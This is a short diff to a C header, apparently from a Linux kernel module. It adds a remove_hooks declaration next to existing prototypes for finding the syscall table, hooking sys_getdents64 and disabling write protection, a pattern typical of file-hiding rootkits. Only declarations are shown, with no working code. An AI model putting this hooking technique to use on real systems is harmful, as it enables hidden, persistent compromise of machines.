@@ -18,6 +18,7 @@ extern asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
 int retrieve_sys_call_table(void);
 void init_hooks(void);
+void remove_hooks(void);
 
 void disable_protection(void);
 void enable_protection(void);
